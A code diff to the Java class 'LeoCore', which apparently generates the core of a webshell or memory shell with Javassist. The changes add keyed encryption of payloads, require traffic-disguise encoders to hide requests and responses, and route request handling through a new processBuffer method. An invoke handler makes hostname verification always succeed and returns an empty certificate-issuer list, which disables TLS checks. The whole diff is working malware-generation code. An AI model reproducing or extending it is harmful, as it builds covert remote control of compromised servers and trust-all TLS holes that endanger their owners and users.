@@ -7,10 +7,12 @@ import org.leo.jmg.ShellGeneratorConfig;
 public class LeoCore {
     Disguise reqDisguise;
     Disguise respDisguise;
+    String payloadKey;
 
-    public LeoCore(Disguise reqDisguise, Disguise respDisguise) {
+    public LeoCore(Disguise reqDisguise, Disguise respDisguise, String payloadKey) {
         this.reqDisguise = reqDisguise;
         this.respDisguise = respDisguise;
+        this.payloadKey = payloadKey;
     }
 
     public CtClass dump(String classname, CoreGenerationNames config) throws CannotCompileException, NotFoundException {
@@ -37,22 +39,6 @@ public class LeoCore {
             CtConstructor defaultCons = new CtConstructor(new CtClass[]{}, ctClass);
             defaultCons.setBody("{super(java.lang.Thread.currentThread().getContextClassLoader());}");
             ctClass.addConstructor(defaultCons);
-        }
-        //invoke (InvocationHandler - handles HostnameVerifier + X509TrustManager via Proxy)
-        {
-            CtMethod invoke = CtNewMethod.make(
-                "public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) throws Throwable {\n" +
-                "    if (method == null) {\n" +
-                "        if (args == null) { return this." + config.getFieldParams() + "; }\n" +
-                "        if (args.length > 0 && args[0] instanceof java.util.HashMap) { this." + config.getFieldResults() + " = (java.util.HashMap) args[0]; return null; }\n" +
-                "        return null;\n" +
-                "    }\n" +
-                "    String name = method.getName();\n" +
-                "    if (name.equals(\"verify\")) return java.lang.Boolean.valueOf(true);\n" +
-                "    if (name.equals(\"getAcceptedIssuers\")) return new java.security.cert.X509Certificate[0];\n" +
-                "    return null;\n" +
-                "}", ctClass);
-            ctClass.addMethod(invoke);
         }
         //testConn
         {
@@ -151,18 +137,31 @@ public class LeoCore {
 
             ctClass.addMethod(redirect);
         }
-        //decode
-        {
-            CtMethod decode = CtNewMethod.make(reqDisguise.getDecodeBody(), ctClass);
-
-            ctClass.addMethod(decode);
+        if (reqDisguise.getTrafficDecodeBody() == null || reqDisguise.getTrafficDecodeBody().trim().isEmpty()
+                || respDisguise.getTrafficEncodeBody() == null || respDisguise.getTrafficEncodeBody().trim().isEmpty()) {
+            throw new IllegalArgumentException("Java Core 必须使用 traffic-only Disguise");
         }
-        //encode
-        {
-            CtMethod encode = CtNewMethod.make(respDisguise.getEncodeBody(), ctClass);
-
-            ctClass.addMethod(encode);
+        if (payloadKey == null || payloadKey.trim().isEmpty()) {
+            throw new IllegalArgumentException("payloadKey不能为空");
         }
+        ctClass.addField(CtField.make(
+                "private static final javax.crypto.spec.SecretKeySpec " + config.getFieldPayloadSecret() + " = "
+                        + PayloadCodecSource.secretKeySource(payloadKey) + ";", ctClass));
+        ctClass.addField(CtField.make(
+                "private static final java.security.SecureRandom " + config.getFieldPayloadRandom()
+                        + " = new java.security.SecureRandom();",
+                ctClass));
+        ctClass.addMethod(CtNewMethod.make(
+                renameTrafficMethod(reqDisguise.getTrafficDecodeBody(), "decodeTraffic",
+                        config.getMethodTrafficDecode()), ctClass));
+        ctClass.addMethod(CtNewMethod.make(
+                renameTrafficMethod(respDisguise.getTrafficEncodeBody(), "encodeTraffic",
+                        config.getMethodTrafficEncode()), ctClass));
+        ctClass.addMethod(CtNewMethod.make(PayloadCodecSource.decodeMethod(
+                config.getMethodPayloadDecode(), config.getFieldPayloadSecret()), ctClass));
+        ctClass.addMethod(CtNewMethod.make(PayloadCodecSource.encodeMethod(
+                config.getMethodPayloadEncode(), config.getFieldPayloadRandom(),
+                config.getFieldPayloadSecret()), ctClass));
         //action
         {
             CtMethod action = CtNewMethod.make("private void " + config.getMethodAction() + "() throws Exception {\n" +
@@ -206,43 +205,61 @@ public class LeoCore {
 
             ctClass.addMethod(action);
         }
-        //equals
+        //processBuffer
         {
-            CtMethod equals = CtNewMethod.make("public boolean equals(Object var1) {\n" +
-                                               "        if (!(var1 instanceof java.io.ByteArrayOutputStream)) {\n" +
-                                               "            return this == var1;\n" +
-                                               "        }\n" +
-                                               "        this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
-                                               "        java.io.ByteArrayOutputStream var2 = (java.io.ByteArrayOutputStream)var1;\n" +
-                                               "        Object var10 = null;\n" +
-                                               "        try {\n" +
-                                               "            this." + config.getFieldParams() + " = this.decode(var2.toByteArray());\n" +
-                                               "            var10 = this." + config.getFieldParams() + ".get(\"requestId\");\n" +
-                                               "            this." + config.getMethodAction() + "();\n" +
-                                               "        } catch (Exception e) {\n" +
-                                               "            java.util.HashMap var11 = new java.util.HashMap();\n" +
-                                               "            java.util.HashMap var12 = new java.util.HashMap();\n" +
-                                               "            if (e.getMessage() != null) var12.put(\"message\", e.getMessage());\n" +
-                                               "            var11.put(\"requestId\", var10);\n" +
-                                               "            var11.put(\"code\", Integer.valueOf(500));\n" +
-                                               "            var11.put(\"error\", var12);\n" +
-                                               "            this." + config.getFieldResults() + " = var11;\n" +
-                                               "        }\n" +
-                                               "        try {\n" +
-                                               "            var2.reset();\n" +
-                                               "            byte[] var3 = this.encode(this." + config.getFieldResults() + ");\n" +
-                                               "            var2.write(var3, 0, var3.length);\n" +
-                                               "        } catch (Exception e2) {}\n" +
-                                               "        return true;\n" +
-                                               "    }", ctClass);
-
-            ctClass.addMethod(equals);
+            CtMethod processBuffer = CtNewMethod.make(
+                "private void " + config.getMethodProcessBuffer() + "(java.io.ByteArrayOutputStream buffer) throws Exception {\n" +
+                "        this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
+                "        Object var10 = null;\n" +
+                "        try {\n" +
+                "            this." + config.getFieldParams() + " = this."
+                        + config.getMethodPayloadDecode() + "(this."
+                        + config.getMethodTrafficDecode() + "(buffer.toByteArray()));\n" +
+                "            var10 = this." + config.getFieldParams() + ".get(\"requestId\");\n" +
+                "            this." + config.getMethodAction() + "();\n" +
+                "        } catch (Exception e) {\n" +
+                "            java.util.HashMap var11 = new java.util.HashMap();\n" +
+                "            java.util.HashMap var12 = new java.util.HashMap();\n" +
+                "            if (e.getMessage() != null) var12.put(\"message\", e.getMessage());\n" +
+                "            var11.put(\"requestId\", var10);\n" +
+                "            var11.put(\"code\", Integer.valueOf(500));\n" +
+                "            var11.put(\"error\", var12);\n" +
+                "            this." + config.getFieldResults() + " = var11;\n" +
+                "        }\n" +
+                "        buffer.reset();\n" +
+                "        byte[] var3 = this." + config.getMethodTrafficEncode() + "(this."
+                        + config.getMethodPayloadEncode() + "(this."
+                        + config.getFieldResults() + "));\n" +
+                "        buffer.write(var3, 0, var3.length);\n" +
+                "    }", ctClass);
+            ctClass.addMethod(processBuffer);
         }
-        //hashCode — equals() contract
+        //invoke (InvocationHandler - handles Core entry and HTTPS proxy callbacks)
         {
-            CtMethod hashCode = CtNewMethod.make(
-                "public int hashCode() { return System.identityHashCode(this); }", ctClass);
-            ctClass.addMethod(hashCode);
+            CtMethod invoke = CtNewMethod.make(
+                "public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) {\n" +
+                "    if (method == null) {\n" +
+                "        if (args == null) return this." + config.getFieldParams() + ";\n" +
+                "        if (args.length == 1 && args[0] instanceof java.io.ByteArrayOutputStream) {\n" +
+                "            try {\n" +
+                "                this." + config.getMethodProcessBuffer() + "((java.io.ByteArrayOutputStream) args[0]);\n" +
+                "            } catch (Exception e) {\n" +
+                "                throw new IllegalStateException(\"Core processing failed\", e);\n" +
+                "            }\n" +
+                "            return null;\n" +
+                "        }\n" +
+                "        if (args.length == 1 && args[0] instanceof java.util.Map) {\n" +
+                "            this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
+                "            this." + config.getFieldResults() + ".putAll((java.util.Map) args[0]);\n" +
+                "        }\n" +
+                "        return null;\n" +
+                "    }\n" +
+                "    String name = method.getName();\n" +
+                "    if (name.equals(\"verify\")) return java.lang.Boolean.valueOf(true);\n" +
+                "    if (name.equals(\"getAcceptedIssuers\")) return new java.security.cert.X509Certificate[0];\n" +
+                "    return null;\n" +
+                "}", ctClass);
+            ctClass.addMethod(invoke);
         }
         return ctClass;
     }
@@ -280,6 +297,18 @@ public class LeoCore {
         } finally {
             ctClass.detach();
         }
+    }
+
+    private static String renameTrafficMethod(String source, String originalName, String generatedName) {
+        if (source == null || source.trim().isEmpty()) {
+            throw new IllegalArgumentException("traffic 编解码方法不能为空");
+        }
+        String marker = originalName + "\\s*\\(";
+        String renamed = source.replaceFirst("\\b" + marker, generatedName + "(");
+        if (renamed.equals(source)) {
+            throw new IllegalArgumentException("traffic 方法缺少 " + originalName + " 声明");
+        }
+        return renamed;
     }
 
 }
